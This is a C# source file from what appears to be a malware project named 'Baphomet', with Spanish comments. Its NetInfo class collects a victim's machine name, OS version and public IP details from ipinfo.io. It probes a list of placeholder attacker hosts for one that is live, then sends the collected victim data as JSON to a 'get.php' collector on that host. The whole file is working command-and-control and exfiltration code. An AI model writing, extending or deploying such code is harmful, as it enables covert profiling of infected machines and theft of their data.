using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using Baphomet.Models;
using System.Net.NetworkInformation;

namespace Baphomet.Utilities
{
    public class NetInfo
    {
        //HttpRequest para obtener info mediante la ip publica.
        public VictimInfoDTO GetVictimInfo()
        {
            var computerName = Environment.MachineName.ToString();
            var operatingSystem = Environment.OSVersion.VersionString;

            WebRequest request = WebRequest.Create("https://ipinfo.io/");
            WebResponse response = request.GetResponse();
            Stream data = response.GetResponseStream();
            string content = String.Empty;
            using (StreamReader sr = new StreamReader(data))
            {
                content = sr.ReadToEnd();
                var contentObje = JsonConvert.DeserializeObject<VictimInfoDTO>(content);
                contentObje.MachineName = computerName;
                contentObje.MachineOs = operatingSystem;
                return contentObje;
            }
        }

        //Verifico si tengo conneccion a internet para poder enviar la data de la victima.
        public bool CheckInternetConnection()
        {
            try
            {
                Ping ping = new Ping();
                PingReply reply = ping.Send(IPAddress.Parse("8.8.8.8"));

                if (reply.Status == IPStatus.Success)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        //Lista de hosting donde revicimos la data/ host list to recive victim data.
        public string HostName()
        {
            var liveHost = "noLive";
            //Archivo que estara alojado en nuestro host encargado de escribir y guardar la data de la victima.
            var phpWriter = "/get.php";

            //Aqui va mi lista de host en caso de que uno de ellos falle.
            //En cada Host tendre un archivo el cual intentare leer, si la peticion se cumple con exito es por que el host esta vivo.
            //En nuestro hostList debemos especificar nuestro host con el nombre del archivo a leer, si el archivo existe en nuestro host esto significa que el host esta vivo.
            var hostList = new []
            {
                "https://wwww.MyExamplehost-1.com/FileToRead.jpg",
                "https://www.MyExamplehost-2.com/FileToRead.jpg",
                "https://wwww.MyExamplehost-3.com/FileToRead.jpg"
            };
            //hago un recorrido de mi lista de host para verificar cual host sigue activo.
            foreach (var host in hostList)
            {
                try
                {
                    using (var client = new WebClient())
                    using (client.OpenRead(host))
                        liveHost = host;
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error:" + ex.Message);
                }
            }

            if (liveHost != "noLive")
            {
                int index = liveHost.LastIndexOf("/");
                if (index > 0)
                    liveHost = liveHost.Substring(0, index);

                return liveHost + phpWriter + "?info=";
            }
            return liveHost;
        }

        //Envio la data de la victima al host vivo.
        public void SendData(VictimInfoDTO victimInfo, string host)
        {
            var jsonData = JsonConvert.SerializeObject(victimInfo);
            var content = host + jsonData;
            var sender = new WebClient().DownloadString(content);
        }
    }
}
